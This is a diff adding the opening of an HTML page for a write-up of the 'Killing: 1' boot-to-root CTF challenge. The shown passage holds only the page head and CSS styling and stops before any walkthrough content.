@@ -1,0 +1,2710 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Killing: 1 — Boot-to-Root CTF Security Report & Attack Chain</title>
+  <meta name="description" content="Technical walkthrough, kill-chain progression matrix, and vulnerability remediation blueprint for Killing: 1 — an isolated boot-to-root Linux CTF challenge.">
+  
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+
+  <style>
+    /* ==========================================================================
+       DESIGN SYSTEM & COLOR TOKENS
+       ========================================================================== */
+    :root {
+      --bg-base: #0a0d0f;
+      --bg-panel: #10151a;
+      --bg-panel-elevated: #151b22;
+      --bg-panel-hover: #19222a;
+      --border-subtle: #1f2a30;
+      --border-medium: #273740;
+      --border-highlight: #3b505c;
+      
+      --text-primary: #d7e0e4;
+      --text-secondary: #8899a6;
+      --text-muted: #5c6b72;
+      
+      --accent-danger: #c23b3b;
+      --accent-danger-glow: rgba(194, 59, 59, 0.22);
+      --accent-danger-dim: rgba(194, 59, 59, 0.12);
+      
+      --accent-success: #4a8f5c;
+      --accent-success-glow: rgba(74, 143, 92, 0.25);
+      --accent-success-dim: rgba(74, 143, 92, 0.12);
+
+      --terminal-prompt: #69a7c9;
+      --terminal-output: #a4b3bc;
+      --terminal-comment: #52636b;
+
+      --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+      
+      --radius-sm: 4px;
+      --radius-md: 8px;
+      --radius-lg: 12px;
+
+      --container-max: 1060px;
+      --transition-standard: 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+      --transition-slow: 0.38s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      background-color: var(--bg-base);
+      color: var(--text-primary);
+      font-family: var(--font-sans);
+      font-size: 16px;
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background-color: var(--bg-base);
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(194, 59, 59, 0.08) 0%, transparent 60%),
+        linear-gradient(to bottom, transparent, rgba(10, 13, 15, 0.96)),
+        linear-gradient(rgba(31, 42, 48, 0.12) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(31, 42, 48, 0.12) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
+      background-position: top center, top center, -1px -1px, -1px -1px;
+      min-height: 100vh;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    ::selection {
+      background: rgba(194, 59, 59, 0.35);
+      color: #ffffff;
+    }
+
+    h1, h2, h3, h4 {
+      color: var(--text-primary);
+      font-weight: 600;
+      line-height: 1.25;
+      letter-spacing: -0.015em;
+    }
+
+    p {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 0.85rem;
+    }
+
+    p:last-child {
+      margin-bottom: 0;
+    }
+
+    a {
+      color: var(--text-primary);
+      text-decoration: none;
+      transition: color var(--transition-standard);
+    }
+
+    a:hover {
+      color: #ffffff;
+    }
+
+    code, kbd, pre {
+      font-family: var(--font-mono);
+      font-size: 0.88em;
+    }
+
+    .inline-code {
+      font-family: var(--font-mono);
+      font-size: 0.86em;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border-subtle);
+      padding: 0.15em 0.4em;
+      border-radius: var(--radius-sm);
+      color: #e2ebf0;
+    }
+
+    .container {
+      width: 100%;
+      max-width: var(--container-max);
+      margin: 0 auto;
+      padding: 0 1.5rem;
+    }
+
+    /* ==========================================================================
+       NAVBAR
+       ========================================================================== */
+    .site-nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(10, 13, 15, 0.85);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border-subtle);
+    }
+
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 60px;
+    }
+
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .nav-brand-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--accent-danger);
+      box-shadow: 0 0 10px var(--accent-danger);
+      animation: pulse-dot 2.5s infinite ease-in-out;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 0.7; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.2); }
+    }
+
+    .nav-brand-sub {
+      color: var(--text-muted);
+      font-weight: 400;
+      font-size: 0.8rem;
+      border-left: 1px solid var(--border-subtle);
+      padding-left: 0.75rem;
+      margin-left: 0.25rem;
+    }
+
+    .nav-controls {
+      display: flex;
+      align-items: center;
+      gap: 1.25rem;
+    }
+
+    .progress-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.6rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      padding: 0.35rem 0.8rem;
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: 999px;
+      color: var(--text-secondary);
+    }
+
+    .progress-meter {
+      width: 50px;
+      height: 5px;
+      background: var(--border-subtle);
+      border-radius: 3px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: var(--accent-success);
+      box-shadow: 0 0 8px var(--accent-success);
+      transition: width var(--transition-standard);
+    }
+
+    .nav-link-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+      font-size: 0.82rem;
+      font-family: var(--font-mono);
+      color: var(--text-secondary);
+      padding: 0.35rem 0.75rem;
+      border-radius: var(--radius-sm);
+      border: 1px solid transparent;
+      transition: all var(--transition-standard);
+    }
+
+    .nav-link-btn:hover {
+      color: var(--text-primary);
+      background: var(--bg-panel-elevated);
+      border-color: var(--border-subtle);
+    }
+
+    /* ==========================================================================
+       HERO SECTION
+       ========================================================================== */
+    .hero {
+      padding: 4.5rem 0 3.25rem;
+      position: relative;
+      opacity: 0;
+      transform: translateY(16px);
+      animation: heroEntrance 0.75s cubic-bezier(0.16, 1, 0.3, 1) 0.1s forwards;
+    }
+
+    @keyframes heroEntrance {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .hero-meta-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 1.25rem;
+      flex-wrap: wrap;
+    }
+
+    .badge-difficulty {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      padding: 0.25rem 0.65rem;
+      border-radius: var(--radius-sm);
+      background: var(--accent-danger-dim);
+      border: 1px solid rgba(194, 59, 59, 0.35);
+      color: #ff7878;
+    }
+
+    .badge-difficulty::before {
+      content: "";
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent-danger);
+    }
+
+    .lab-status-badge {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .hero-title {
+      font-size: clamp(2.4rem, 5vw, 3.8rem);
+      font-weight: 700;
+      color: var(--text-primary);
+      line-height: 1.08;
+      letter-spacing: -0.035em;
+      margin-bottom: 1rem;
+    }
+
+    .hero-title .title-accent {
+      color: var(--accent-danger);
+      text-shadow: 0 0 24px rgba(194, 59, 59, 0.3);
+    }
+
+    .hero-subtitle {
+      font-size: clamp(1.05rem, 2vw, 1.3rem);
+      color: var(--text-secondary);
+      font-weight: 400;
+      max-width: 680px;
+      margin-bottom: 1.75rem;
+      line-height: 1.5;
+    }
+
+    .stat-chips-group {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 2.25rem;
+      flex-wrap: wrap;
+    }
+
+    .stat-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      padding: 0.4rem 0.85rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: var(--text-primary);
+      transition: all var(--transition-standard);
+    }
+
+    .stat-chip:hover {
+      border-color: var(--border-medium);
+      transform: translateY(-1px);
+    }
+
+    .stat-chip-icon {
+      color: var(--accent-danger);
+      display: flex;
+      align-items: center;
+    }
+
+    .hero-actions {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.55rem;
+      font-family: var(--font-sans);
+      font-size: 0.92rem;
+      font-weight: 500;
+      padding: 0.65rem 1.35rem;
+      border-radius: var(--radius-sm);
+      border: 1px solid transparent;
+      cursor: pointer;
+      transition: all var(--transition-standard);
+      text-decoration: none;
+    }
+
+    .btn-primary {
+      background: var(--accent-danger);
+      color: #ffffff;
+      box-shadow: 0 4px 16px rgba(194, 59, 59, 0.25);
+    }
+
+    .btn-primary:hover {
+      background: #d44343;
+      box-shadow: 0 6px 20px rgba(194, 59, 59, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-secondary {
+      background: var(--bg-panel);
+      color: var(--text-primary);
+      border-color: var(--border-subtle);
+    }
+
+    .btn-secondary:hover {
+      background: var(--bg-panel-elevated);
+      border-color: var(--border-medium);
+      color: #ffffff;
+      transform: translateY(-1px);
+    }
+
+    /* ==========================================================================
+       SECTION COMMON STYLES
+       ========================================================================== */
+    .section-wrapper {
+      padding: 3.25rem 0;
+      border-top: 1px solid var(--border-subtle);
+    }
+
+    .section-header {
+      margin-bottom: 2rem;
+    }
+
+    .section-eyebrow {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--accent-danger);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 0.4rem;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+    }
+
+    .section-title {
+      font-size: 1.75rem;
+      font-weight: 700;
+      color: var(--text-primary);
+      letter-spacing: -0.025em;
+    }
+
+    .section-desc {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      max-width: 780px;
+      margin-top: 0.4rem;
+    }
+
+    /* ==========================================================================
+       OVERVIEW & LAB SPECIFICATIONS
+       ========================================================================== */
+    .overview-grid {
+      display: grid;
+      grid-template-columns: 1.25fr 1fr;
+      gap: 1.5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .panel-card {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      position: relative;
+    }
+
+    .card-title-sm {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-bottom: 0.85rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .card-title-sm svg {
+      color: var(--accent-danger);
+    }
+
+    .requirements-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+    }
+
+    .requirements-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.65rem;
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+    }
+
+    .req-bullet {
+      color: var(--accent-danger);
+      font-weight: bold;
+    }
+
+    .specs-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 0.75rem;
+      font-size: 0.85rem;
+      font-family: var(--font-mono);
+    }
+
+    .specs-table td {
+      padding: 0.45rem 0;
+      border-bottom: 1px solid rgba(31, 42, 48, 0.7);
+    }
+
+    .specs-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .specs-table .spec-key {
+      color: var(--text-muted);
+      width: 38%;
+    }
+
+    .specs-table .spec-val {
+      color: var(--text-primary);
+    }
+
+    .disclaimer-box {
+      background: rgba(194, 59, 59, 0.05);
+      border: 1px solid var(--accent-danger);
+      border-left-width: 4px;
+      border-radius: var(--radius-sm);
+      padding: 1.1rem 1.25rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.9rem;
+    }
+
+    .disclaimer-icon {
+      color: var(--accent-danger);
+      flex-shrink: 0;
+      margin-top: 0.15rem;
+    }
+
+    .disclaimer-title {
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
+      font-weight: 700;
+      color: #ff9191;
+      margin-bottom: 0.25rem;
+    }
+
+    .disclaimer-text {
+      font-size: 0.88rem;
+      color: #b8c7cf;
+      line-height: 1.5;
+    }
+
+    /* ==========================================================================
+       KILL-CHAIN PROGRESSION MATRIX (TABLE)
+       ========================================================================== */
+    .matrix-card {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      margin-top: 1rem;
+    }
+
+    .matrix-table-wrap {
+      width: 100%;
+      overflow-x: auto;
+    }
+
+    .matrix-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.86rem;
+    }
+
+    .matrix-table th {
+      background: #0d1216;
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--text-muted);
+      padding: 0.85rem 1rem;
+      border-bottom: 1px solid var(--border-subtle);
+      white-space: nowrap;
+    }
+
+    .matrix-table td {
+      padding: 0.9rem 1rem;
+      border-bottom: 1px solid rgba(31, 42, 48, 0.5);
+      vertical-align: middle;
+    }
+
+    .matrix-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .matrix-table tr:hover td {
+      background: rgba(255, 255, 255, 0.015);
+    }
+
+    .phase-badge {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--text-primary);
+      white-space: nowrap;
+    }
+
+    .access-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      padding: 0.2rem 0.55rem;
+      border-radius: var(--radius-sm);
+      background: var(--bg-panel-elevated);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      white-space: nowrap;
+    }
+
+    .access-pill.root-level {
+      background: var(--accent-danger-dim);
+      border-color: rgba(194, 59, 59, 0.4);
+      color: #ff9d9d;
+    }
+
+    .matrix-token {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: #ffffff;
+      background: rgba(194, 59, 59, 0.08);
+      border: 1px solid var(--accent-danger);
+      padding: 0.2rem 0.5rem;
+      border-radius: var(--radius-sm);
+      white-space: nowrap;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .matrix-token.none {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      padding: 0;
+    }
+
+    .status-completed-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      padding: 0.2rem 0.55rem;
+      border-radius: var(--radius-sm);
+      background: var(--accent-success-dim);
+      border: 1px solid var(--accent-success);
+      color: var(--accent-success);
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+
+    /* ==========================================================================
+       ATTACK CHAIN INTERACTIVE FLOW DIAGRAM
+       ========================================================================== */
+    .chain-container {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      padding: 1.75rem 1.5rem;
+      position: relative;
+      overflow-x: auto;
+    }
+
+    .chain-flow {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+      min-width: 720px;
+    }
+
+    .chain-node {
+      flex: 1;
+      background: var(--bg-panel-elevated);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      padding: 1rem 0.85rem;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.4rem;
+      cursor: pointer;
+      transition: all var(--transition-standard);
+    }
+
+    .chain-node:hover {
+      border-color: var(--accent-danger);
+      background: var(--bg-panel-hover);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 14px var(--accent-danger-glow);
+    }
+
+    .chain-node.completed {
+      border-color: var(--accent-success);
+    }
+
+    .chain-node.completed:hover {
+      border-color: var(--accent-success);
+      box-shadow: 0 4px 14px var(--accent-success-glow);
+    }
+
+    .chain-node-stage {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .chain-node-title {
+      font-family: var(--font-mono);
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      white-space: nowrap;
+    }
+
+    .chain-node-status {
+      font-size: 0.72rem;
+      font-family: var(--font-mono);
+      color: var(--accent-danger);
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+    }
+
+    .chain-node.completed .chain-node-status {
+      color: var(--accent-success);
+    }
+
+    .chain-connector {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--border-highlight);
+      padding: 0 0.2rem;
+      flex-shrink: 0;
+    }
+
+    .chain-hint {
+      margin-top: 1rem;
+      font-size: 0.78rem;
+      font-family: var(--font-mono);
+      color: var(--text-muted);
+      text-align: center;
+    }
+
+    /* ==========================================================================
+       TECHNICAL WALKTHROUGH & EXPLOITATION LIFECYCLE
+       ========================================================================== */
+    .walkthrough-toolbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .walkthrough-meta {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: var(--text-secondary);
+    }
+
+    .toolbar-actions {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .btn-tool {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      padding: 0.35rem 0.75rem;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      transition: all var(--transition-standard);
+    }
+
+    .btn-tool:hover {
+      background: var(--bg-panel-elevated);
+      color: var(--text-primary);
+      border-color: var(--border-medium);
+    }
+
+    .stage-list {
+      display: flex;
+      flex-direction: column;
+      gap: 1.15rem;
+    }
+
+    .stage-item {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      transition: border-color var(--transition-standard), background var(--transition-standard);
+      overflow: hidden;
+      scroll-margin-top: 80px;
+    }
+
+    .stage-item:hover {
+      border-color: var(--border-medium);
+    }
+
+    .stage-item.open {
+      border-color: var(--border-highlight);
+    }
+
+    .stage-item.is-completed {
+      border-left: 3px solid var(--accent-success);
+    }
+
+    .stage-header {
+      padding: 1.25rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .stage-header:hover {
+      background: rgba(255, 255, 255, 0.015);
+    }
+
+    .stage-header-left {
+      display: flex;
+      align-items: center;
+      gap: 1.1rem;
+      flex: 1;
+    }
+
+    .stage-index-badge {
+      width: 36px;
+      height: 36px;
+      border-radius: var(--radius-sm);
+      background: var(--bg-panel-elevated);
+      border: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      flex-shrink: 0;
+      transition: all var(--transition-standard);
+    }
+
+    .stage-item.is-completed .stage-index-badge {
+      background: var(--accent-success-dim);
+      border-color: var(--accent-success);
+      color: var(--accent-success);
+    }
+
+    .stage-header-text {
+      display: flex;
+      flex-direction: column;
+      gap: 0.2rem;
+    }
+
+    .stage-tagline {
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .flag-indicator-pill {
+      background: var(--accent-danger-dim);
+      border: 1px solid rgba(194, 59, 59, 0.35);
+      color: #ff8585;
+      padding: 0.1rem 0.45rem;
+      border-radius: var(--radius-sm);
+      font-size: 0.68rem;
+      font-weight: 600;
+    }
+
+    .stage-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      letter-spacing: -0.015em;
+    }
+
+    .stage-header-right {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .step-check-btn {
+      background: transparent;
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      padding: 0.35rem 0.65rem;
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      cursor: pointer;
+      transition: all var(--transition-standard);
+    }
+
+    .step-check-btn:hover {
+      border-color: var(--accent-success);
+      color: var(--accent-success);
+    }
+
+    .stage-item.is-completed .step-check-btn {
+      background: var(--accent-success-dim);
+      border-color: var(--accent-success);
+      color: var(--accent-success);
+    }
+
+    .accordion-chevron {
+      color: var(--text-muted);
+      transition: transform var(--transition-slow);
+      display: flex;
+      align-items: center;
+    }
+
+    .stage-item.open .accordion-chevron {
+      transform: rotate(180deg);
+    }
+
+    .stage-content-wrapper {
+      display: grid;
+      grid-template-rows: 0fr;
+      transition: grid-template-rows var(--transition-slow);
+    }
+
+    .stage-item.open .stage-content-wrapper {
+      grid-template-rows: 1fr;
+    }
+
+    .stage-content-inner {
+      overflow: hidden;
+    }
+
+    .stage-body {
+      padding: 0.5rem 1.5rem 1.75rem;
+      border-top: 1px solid rgba(31, 42, 48, 0.6);
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    .step-label {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+      margin-bottom: 0.4rem;
+    }
+
+    .step-label svg {
+      color: var(--accent-danger);
+    }
+
+    /* Terminal Window Styling */
+    .terminal-container {
+      background: #090c0e;
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+      margin: 0.4rem 0;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.35);
+    }
+
+    .terminal-bar {
+      background: #0f1418;
+      border-bottom: 1px solid var(--border-subtle);
+      padding: 0.45rem 0.85rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .terminal-dots {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .terminal-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .dot-red { background: #e04b4b; opacity: 0.8; }
+    .dot-yellow { background: #dca33e; opacity: 0.8; }
+    .dot-green { background: #4ca35f; opacity: 0.8; }
+
+    .terminal-title {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--text-muted);
+    }
+
+    .copy-btn {
+      background: transparent;
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      padding: 0.2rem 0.55rem;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      transition: all var(--transition-standard);
+    }
+
+    .copy-btn:hover {
+      background: var(--bg-panel-elevated);
+      color: var(--text-primary);
+      border-color: var(--border-highlight);
+    }
+
+    .copy-btn.copied {
+      background: var(--accent-success-dim);
+      border-color: var(--accent-success);
+      color: var(--accent-success);
+    }
+
+    .terminal-code {
+      padding: 0.9rem 1.1rem;
+      font-family: var(--font-mono);
+      font-size: 0.86rem;
+      color: var(--text-primary);
+      overflow-x: auto;
+      line-height: 1.6;
+      white-space: pre;
+    }
+
+    .code-prompt {
+      color: var(--terminal-prompt);
+      user-select: none;
+      font-weight: 600;
+    }
+
+    .code-comment {
+      color: var(--terminal-comment);
+      font-style: italic;
+    }
+
+    .code-output {
+      color: var(--terminal-output);
+      display: block;
+      margin-top: 0.4rem;
+      border-left: 2px solid var(--border-subtle);
+      padding-left: 0.75rem;
+    }
+
+    .code-highlight {
+      color: #ffd166;
+    }
+
+    /* Flag Token Box */
+    .flag-box {
+      background: rgba(194, 59, 59, 0.04);
+      border: 1px solid var(--accent-danger);
+      box-shadow: 0 0 16px var(--accent-danger-glow);
+      border-radius: var(--radius-sm);
+      padding: 0.9rem 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      margin-top: 0.5rem;
+    }
+
+    .stage-item.is-completed .flag-box {
+      background: rgba(74, 143, 92, 0.06);
+      border-color: var(--accent-success);
+      box-shadow: 0 0 16px var(--accent-success-glow);
+    }
+
+    .flag-box-left {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+    }
+
+    .flag-icon {
+      color: var(--accent-danger);
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    .stage-item.is-completed .flag-icon {
+      color: var(--accent-success);
+    }
+
+    .flag-content {
+      display: flex;
+      flex-direction: column;
+      gap: 0.15rem;
+    }
+
+    .flag-tag {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      color: var(--accent-danger);
+      text-transform: uppercase;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+    }
+
+    .stage-item.is-completed .flag-tag {
+      color: var(--accent-success);
+    }
+
+    .flag-value {
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #ffffff;
+      letter-spacing: 0.02em;
+    }
+
+    .note-box {
+      background: var(--bg-panel-elevated);
+      border-left: 3px solid var(--border-highlight);
+      border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+      padding: 0.75rem 1rem;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+    }
+
+    .note-box strong {
+      color: var(--text-primary);
+    }
+
+    .note-box.success-note {
+      border-left-color: var(--accent-success);
+      background: rgba(74, 143, 92, 0.05);
+    }
+
+    /* ==========================================================================
+       VULNERABILITY REMEDIATION & HARDENING BLUEPRINT
+       ========================================================================== */
+    .lessons-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(310px, 1fr));
+      gap: 1.5rem;
+    }
+
+    .lesson-card {
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      transition: all var(--transition-standard);
+    }
+
+    .lesson-card:hover {
+      border-color: var(--border-medium);
+      transform: translateY(-2px);
+    }
+
+    .lesson-card-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+    }
+
+    .lesson-icon-badge {
+      width: 32px;
+      height: 32px;
+      border-radius: var(--radius-sm);
+      background: var(--accent-danger-dim);
+      border: 1px solid rgba(194, 59, 59, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--accent-danger);
+      flex-shrink: 0;
+    }
+
+    .lesson-case-tag {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--accent-danger);
+      text-transform: uppercase;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+    }
+
+    .lesson-title {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-top: 0.15rem;
+    }
+
+    .vuln-desc-box {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .vuln-desc-box strong {
+      color: var(--text-primary);
+    }
+
+    .fix-container {
+      margin-top: auto;
+      background: var(--bg-panel-elevated);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      padding: 0.85rem 1rem;
+    }
+
+    .fix-label {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: var(--accent-success);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 0.3rem;
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .fix-content {
+      font-size: 0.85rem;
+      color: var(--text-primary);
+    }
+
+    .fix-code {
+      display: block;
+      margin-top: 0.4rem;
+      background: rgba(0, 0, 0, 0.35);
+      padding: 0.35rem 0.6rem;
+      border-radius: var(--radius-sm);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: #9cdcfe;
+      white-space: pre-wrap;
+    }
+
+    /* ==========================================================================
+       TECHNICAL COMPETENCIES VALIDATED
+       ========================================================================== */
+    .skills-badges-wrap {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+      margin-top: 1rem;
+    }
+
+    .skill-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: var(--bg-panel);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-sm);
+      padding: 0.5rem 0.9rem;
+      font-family: var(--font-mono);
+      font-size: 0.84rem;
